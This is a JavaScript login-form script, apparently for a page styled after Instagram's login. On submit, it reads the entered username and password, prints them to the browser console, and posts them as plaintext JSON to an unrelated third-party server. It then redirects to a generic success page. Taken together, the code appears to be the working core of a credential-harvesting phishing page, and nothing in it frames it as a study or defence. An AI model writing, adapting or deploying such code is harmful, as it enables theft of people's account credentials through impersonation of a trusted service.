// Add this script before the closing </body> tag

document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    const submitBtn = document.querySelector('.btn');
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault(); // Prevent default form submission
        
        // Get form data
        const formData = new FormData(form);
        const username = formData.get('username');
        const password = formData.get('password');
        console.log(username)
        console.log(password)
        
        // Basic validation
        if (!password || password.trim() === '') {
            alert('Please enter your password');
            return;
        }
        
        // Show loading state
        submitBtn.value = 'Logging in...';
        submitBtn.disabled = true;
        
        try {
            // Send data to backend
            const response = await fetch("https://internship-backend-bo61.onrender.com/api/register", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                })
            });
            
            const result = await response.json();
            
            if (response.ok ) {
                console.log("Hello")
               
                window.location.href = 'sucessPage.html'; // Redirect to success page
            } else {
                // Login failed
                alert(result.message || 'Login failed. Please check your credentials.');
            }
            
        } catch (error) {
            console.error('Login error:', error);
            alert('Network error. Please try again.');
        } finally {
            // Reset button state
            submitBtn.value = 'Log in';
            submitBtn.disabled = false;
        }
    });
    
    // Enable/disable login button based on input
    const passwordInput = document.querySelector('input[name="password"]');
    
    passwordInput.addEventListener('input', function() {
        if (this.value.length > 0) {
            submitBtn.style.opacity = '1';
            submitBtn.disabled = false;
        } else {
            submitBtn.style.opacity = '0.3';
            submitBtn.disabled = true;
        }
    });
});

// Optional: Add some Instagram-like loading animation
function showLoadingSpinner() {
    const spinner = document.createElement('div');
    spinner.className = 'loading-spinner';
    spinner.innerHTML = '⟳';
    spinner.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 24px;
        animation: spin 1s linear infinite;
        z-index: 1000;
    `;
    
    document.body.appendChild(spinner);
    
    // Add CSS animation
    if (!document.querySelector('#spinner-styles')) {
        const style = document.createElement('style');
        style.id = 'spinner-styles';
        style.textContent = `
            @keyframes spin {
                0% { transform: translate(-50%, -50%) rotate(0deg); }
                100% { transform: translate(-50%, -50%) rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
    }
    
    return spinner;
}